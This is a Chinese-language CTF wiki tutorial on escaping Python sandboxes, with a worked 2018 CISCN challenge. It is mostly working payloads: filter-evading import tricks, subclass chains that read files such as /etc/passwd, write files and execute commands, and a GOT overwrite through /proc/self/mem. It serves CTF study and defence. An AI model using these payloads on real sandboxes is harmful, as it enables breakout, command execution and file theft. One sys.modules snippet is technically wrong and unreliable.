[EN](./python-sandbox-escape.md) | [ZH](./python-sandbox-escape-zh.md)
---
typora-root-url: ../../../docs
---

# Python 沙盒
所谓的 Python 沙盒，即以一定的方法模拟 Python 终端，实现用户对 Python 的使用。

# Python 沙箱逃逸的一些方法
我们通常所说的 Python 沙箱逃逸就是绕过模拟的 Python 终端，最终实现命令执行。
## 导入模块
在 Python 的内建函数中，有一些函数可以帮助我们实现任意命令执行：
```
os.system() os.popen()
commands.getstatusoutput() commands.getoutput()
commands.getstatus()
subprocess.call(command, shell=True) subprocess.Popen(command, shell=True)
pty.spawn()
```
在 Python 中导入模块的方法通常有三种（xxx 为模块名称）：

1. `import xxx`
2. `from xxx import *`
3. `__import__('xxx')`

我们可以通过上述的导入方法，导入相关模块并使用上述的函数实现命令执行。
除此之外，我们也可以**通过路径引入模块**：
如在 linux 系统中 Python 的 os 模块的路径一般都是在 `/usr/lib/python2.7/os.py`，当知道路径的时候，我们就可以通过如下的操作导入模块，然后进一步使用相关函数。
```py
>>> import sys
>>> sys.modules['os']='/usr/lib/python2.7/os.py'
>>> import os
>>>
```
**其他的危险函数举例**
如 **execfile** 文件执行
```py
>>> execfile('/usr/lib/python2.7/os.py')
>>> system('cat /etc/passwd')
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
>>> getcwd()
'/usr/lib/python2.7'
```
**timeit**
```py
import timeit
timeit.timeit("__import__('os').system('dir')",number=1)
```

** exec 和 eval 比较经典了**
```py
eval('__import__("os").system("dir")')

```
**platform**
```py
import platform
print platform.popen('dir').read()
```

但是，正常的 Python 沙箱会以黑名单的形式禁止使用一些模块如 os 或以白名单的形式只允许用户使用沙箱提供的模块，用以阻止用户的危险操作。而如何进一步逃逸沙箱就是我们的重点研究内容。

## Python 的内建函数
当我们不能导入模块，或者想要导入的模块被禁，那么我们只能寻求 Python 本身内置函数（即通常不用人为导入，Python 本身默认已经导入的函数）。我们可以通过可以通过 `dir __builtin__` 来获取内置函数列表
```python
>>> dir(__builtins__)
['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BufferError', 'BytesWarning', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'NameError', 'None', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'ReferenceError', 'RuntimeError', 'RuntimeWarning', 'StandardError', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'ZeroDivisionError', '_', '__debug__', '__doc__', '__import__', '__name__', '__package__', 'abs', 'all', 'any', 'apply', 'basestring', 'bin', 'bool', 'buffer', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'cmp', 'coerce', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'execfile', 'exit', 'file', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'intern', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'long', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'raw_input', 'reduce', 'reload', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'unichr', 'unicode', 'vars', 'xrange', 'zip']
```
在 Python 中，不引入直接使用的内置函数被成为 **builtin** 函数，随着 **__builtin__** 这个模块自动引入到环境中。那么我们如何引入的模块呢？我们可以通过 **__dict__** 引入我们想要引入的模块。**__dict__** 的作用是列出一个模组/类/对象 下面 所有的属性和函数。这在沙盒逃逸中是很有用的,可以找到隐藏在其中的一些东西
**__dict__**能做什么呢？
我们知道，一个模块对象有一个由字典对象实现的命名空间，属性的引用会被转换为这个字典中的查找，例如，m.x 等同于 m.dict["x"]。

绕过实例：
首先通过 base64 绕过字符明文检测
```python
>>> import base64
>>> base64.b64encode('__import__')
'X19pbXBvcnRfXw=='
>>> base64.b64encode('os')
'b3M='
```
然后通过 **__dict__** 引用
```py
>>> __builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64'))
```

*如果一些 内敛函数在 __builtins__ 删除 ，我们可以通过 reload(__builtins__) 重新载入获取一个完整的 __builtins__*
## 创建对象以及引用
Python 的 object 类中集成了很多的基础函数，我们想要调用的时候也是可以通过创建对象进而引用。

我们有常见的两个方法：
```bash
().__class__.__bases__[0]
''.__class__.__mro__[2]
```
![](http://oayoilchh.bkt.clouddn.com/18-5-3/14928461.jpg)
如，我们可通过
`print ().__class__.__bases__[0].__subclasses__()[40]("/etc/services").read()`达到文件读取的效果，

**常见payload**
```py
#读文件
().__class__.__bases__[0].__subclasses__()[40](r'C:\1.php').read()

#写文件
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')

#执行任意命令
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls  /var/www/html").read()' )
```

## 间接引用
在有些题目中，如这次的2018年国赛的 Python 沙盒题目上，import 其实整个是被阉割了。但是在 Python 中，原生的 **__import__** 是存在被引用的，只要我们找到相关对象引用就可以进一步获取我们想要的内容，具体下面的demo会讲述到

## write修改got表
实际上是一个 **/proc/self/mem** 的内存操作方法
**/proc/self/mem** 是内存镜像，能够通过它来读写到进程的所有内存，包括可执行代码，如果我们能获取到Python一些函数的偏移，如 **system** ，我们便可以通过覆写 got 表达到 getshell的目的。
```py
(lambda r,w:r.seek(0x08de2b8) or w.seek(0x08de8c8) or w.write(r.read(8)) or ().__class__.__bases__[0].__subclasses__()[40]('c'+'at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb'))(().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem','r'),().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem', 'w', 0))
```
第一个地址是 system 的偏移，第二个是fopen的偏移，我们可以通过 **objdump** 获取相关信息
![](http://oayoilchh.bkt.clouddn.com/18-5-3/25123674.jpg)

# 例子
2018 ciscn 全国大学生信息安全竞赛中的 Python 沙箱逃逸。
我们可以通过`print ().__class__.__bases__[0].__subclasses__()[40]("/home/ctf/sandbox.py").read()` 获取题目源码，然后可以进一步分析，以下提供三种逃逸方法。
### 创建对象并利用 Python 操作字符串的特性
```py
x = [x for x in [].__class__.__base__.__subclasses__() if x.__name__ == 'ca'+'tch_warnings'][0].__init__
x.__getattribute__("func_global"+"s")['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('l'+'s')
x.__getattribute__("func_global"+"s")['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('l'+'s /home/ctf')
x.__getattribute__("func_global"+"s")['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ca'+'t /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb')
```
### 劫持 got 表 getshell
```py
(lambda r,w:r.seek(0x08de2b8) or w.seek(0x08de8c8) or w.write(r.read(8)) or ().__class__.__bases__[0].__subclasses__()[40]('l'+'s /home/ctf/'))(().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem','r'),().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem', 'w', 0))


(lambda r,w:r.seek(0x08de2b8) or w.seek(0x08de8c8) or w.write(r.read(8)) or ().__class__.__bases__[0].__subclasses__()[40]('c'+'at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb'))(().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem','r'),().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem', 'w', 0))

```
### 寻找 __import__ 的间接引用
在不断的 dir 过程中，发现 __closure__  这个 object 保存了参数，可以引用原生的 __import__
```py

print __import__.__getattribute__('__clo'+'sure__')[0].cell_contents('o'+'s').__getattribute__('sy'+'stem')('l'+'s home') 
```
# 参考
https://xz.aliyun.com/t/52#toc-10 
https://blog.csdn.net/qq_35078631/article/details/78504415 
https://www.anquanke.com/post/id/85571 
http://bestwing.me/2018/05/03/awesome-python-sandbox-in-ciscn/#0x01
